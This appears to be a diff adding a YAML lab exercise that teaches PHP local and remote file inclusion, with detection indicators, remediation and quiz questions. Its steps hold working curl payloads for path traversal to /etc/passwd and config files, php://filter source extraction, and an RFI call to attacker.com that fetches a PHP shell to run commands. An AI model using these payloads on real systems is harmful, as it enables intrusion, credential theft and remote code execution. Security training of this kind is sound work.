@@ -1,0 +1,104 @@
+# Category: Offensive Security - Web
+name: "Local and Remote File Inclusion (LFI/RFI)"
+id: "web-lfi-rfi-001"
+category: "offensive_security"
+subcategory: "web_application"
+difficulty: "beginner"
+estimated_time: "45 minutes"
+
+description: |
+  Exploit file inclusion vulnerabilities to read local files (LFI) or
+  include remote files (RFI) via PHP or other server‑side languages. LFI
+  can lead to sensitive file disclosure, source code exposure, and RCE
+  via log poisoning. RFI allows executing arbitrary remote code if
+  `allow_url_include` is enabled.
+
+learning_objectives:
+  - Identify file inclusion parameters (e.g., page=, file=, include=)
+  - Perform LFI to read /etc/passwd, /var/log/apache/access.log
+  - Use PHP wrappers (php://filter) to read source code
+  - Exploit RFI to execute remote shell
+
+tools:
+  - Burp Suite
+  - curl
+  - PHP wrappers
+  - RFI payloads (e.g., PHP shell)
+
+prerequisites:
+  - PHP application with dynamic file inclusion
+  - LFI: parameter pointing to a file path
+  - RFI: `allow_url_include` enabled
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Identify vulnerable parameters"
+    commands:
+      - "# Test with typical payloads"
+      - "curl -v 'http://target.com/page.php?file=../../../../etc/passwd'"
+      - "# Look for error messages revealing path"
+    expected_output: "Content of /etc/passwd or error indicating path traversal"
+    detection: "Web server logs with ../ patterns"
+
+  - id: "step2"
+    phase: "exploitation_lfi"
+    action: "Read sensitive files and source code"
+    commands:
+      - "# Read configuration file"
+      - "curl 'http://target.com/page.php?file=../../../../var/www/html/config.php'"
+      - "# Use php://filter to encode source code (Base64)"
+      - "curl 'http://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php'"
+      - "# Decode output to get source"
+    expected_output: "DB credentials, application secrets, source code"
+    detection: "Access to non‑public files in logs"
+
+  - id: "step3"
+    phase: "exploitation_rfi"
+    action: "Execute remote code (RFI)"
+    commands:
+      - "# Host a PHP shell on attacker server (http://attacker.com/shell.php)"
+      - "curl 'http://target.com/page.php?file=http://attacker.com/shell.php&cmd=id'"
+      - "# If successful, server executes command"
+    expected_output: "Command output (e.g., uid=33(www-data))"
+    detection: "Outbound HTTP requests to external domains from the web server"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1190"
+    description: "Exploit Public-Facing Application"
+  - standard: "OWASP"
+    control: "A03:2021"
+    description: "Injection"
+
+detection:
+  network_indicators:
+    - "HTTP requests with `..`, `php://`, `http://` in file parameters"
+  log_indicators:
+    - "Web server access logs showing inclusion of /etc/passwd"
+    - "Error logs with 'failed to open stream' messages"
+  endpoint_indicators:
+    - "New files created in web directory (from RFI shell)"
+
+remediation:
+  immediate:
+    - "Disable `allow_url_include` in php.ini"
+    - "Use whitelist for included files (e.g., only allow specific pages)"
+  long_term:
+    - "Move user input to indexes, not direct file paths"
+    - "Use `realpath()` to validate file location"
+
+variables:
+  target_url: "http://example.com/page.php"
+  file_param: "file"
+
+assessment_questions:
+  - "What is the difference between LFI and RFI?"
+  - "How can you read source code using php://filter?"
+  - "What configuration setting allows RFI in PHP?"
+
+references:
+  - url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"
+    title: "OWASP LFI"
+  - url: "https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/"
+    title: "Acunetix LFI Guide"
